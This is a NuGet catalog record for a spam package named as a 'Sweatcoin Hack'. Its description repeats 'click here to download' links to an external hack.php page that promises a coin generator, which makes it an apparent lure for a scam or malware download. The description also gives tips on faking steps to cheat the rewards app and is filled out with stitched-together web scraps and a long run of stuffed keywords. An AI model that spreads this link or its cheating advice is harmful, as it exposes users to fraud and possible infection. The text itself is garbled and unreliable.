{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.08.33.26/_sweatcoin-hack-working-2022-version-haq.1.5.58.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "6838b2b7-1b86-49a9-8d93-0e173b2d4ac5",
  "catalog:commitTimeStamp": "2022-01-26T08:33:26.0009559Z",
  "created": "2022-01-26T08:30:41.46Z",
  "description": "# _Sweatcoin Hack Working 2022 Version haq\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://bltadwin.ru/hack.php](http://bltadwin.ru/hack.php)\n\n\nThe only known working exploit involves shaking your phone while walking to earn double the coins. Try this with caution so you don't trigger their spoofing. 1 Source for all things Sweatcoin. Can you use a Sweatcoin Hack to gather or generate more Sweatcoins? This is a question that I get almost daily from. Companies give away free products and services in exchange for Sweatcoin. When someone hacks the system to gain free Sweatcoins, they're taking away these.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://bltadwin.ru/hack.php](http://bltadwin.ru/hack.php)\n\n · Sweatcoin Hacks To Get More Sweatcoins. Primarily if you are in the free mode you can collect maximum 5 Sweatcoin daily. Which means even you go for steps When you improve to Shaker mode you can collect 10 Sweatcoins daily but that does not come free. You need to spend In Quaker mode Estimated Reading Time: 10 mins.  · Sweatcoin Hack Get Coins Without Moving In Working – Youtube. Sweatcoin Review Is The Step Tracking App Legit Or Is It A Scam. How To Transfer Sweatcoin Money To Paypal Cash App. New Sweatcoin Hack How To Get Unlimited Sweatcoins In – Youtube. as for Sweatcoin slogan \"pay you to get fit\" you get a healthy body while earning cryptocurrency at the same, isn't it cool enough to a Sweatcoin a try? Even better. you can fake or falsify your walking by using our Sweatcoin Hack Generator. Stop wasting your time walking nowhere else keep staying on your comfortable couch.\n\nsweatcoin hack 2021, sweatcoin hack apk, sweatcoin hack reddit, sweatcoin hack ios, sweatcoin hack android, sweatcoin hack mod apk, sweatcoin hack app, can you cheat on sweatcoin, sweatcoin hack 2020, sweatcoin hack android 2020, best sweatcoin hack, sweatcoin hack cydia, sweatcoin cheat codes, sweatcoin cheat club, can you hack sweatcoin, can you cheat sweatcoin, how to cheat sweatcoin, sweatcoin hack download, sweatcoin hack deutsch, sweatcoin hack apk download, hack for sweatcoin, sweatcoin hack francais, sweatcoin hack no human verification, sweatcoin hack without human verification, sweatcoin hack ios 2020, sweatcoin hack ita, sweatcoin invite hack, sweatcoin influencer hack, is sweatcoin fake, sweatcoin hack jailbreak, sweatcoin money hack, new sweatcoin hack, how to hack sweatcoin on android, how to hack sweatcoin on iphone, sweatcoin paypal hack, how to use sweatcoin with paypal, how to turn sweatcoin into paypal, how to redeem sweatcoins to paypal, sweatcoin referral hack, sweatcoin cheat reddit, sweatcoin steps hack, how to cheat in sweatcoin, how much is 1 sweatcoin, sweatcoin hack tool, sweatcoin walking hack, sweatcoin glitch 2021, sweatcoin cheat 2020, sweatcoin glitch 2020, sweatcoin mod",
  "id": "_Sweatcoin-Hack-Working-2022-Version-haq",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T08:33:13.397Z",
  "listed": true,
  "packageHash": "B/5NyZqK3P9UAldkavPaumErXbrc3u9HFCaVYP5yVKmNxlNwO034zeNN9SQjfCJXE3tHBgMB5ccdYBA0PmNP1Q==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11469,
  "published": "2022-01-26T08:30:41.46Z",
  "requireLicenseAcceptance": false,
  "title": "_Sweatcoin-Hack-Working-2022-Version-haq",
  "verbatimVersion": "1.5.58",
  "version": "1.5.58",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.08.33.26/_sweatcoin-hack-working-2022-version-haq.1.5.58.json#poxjclnear.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1346,
      "fullName": "poxjclnear.nuspec",
      "length": 3312,
      "name": "poxjclnear.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.08.33.26/_sweatcoin-hack-working-2022-version-haq.1.5.58.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9463,
      "fullName": ".signature.p7s",
      "length": 9463,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}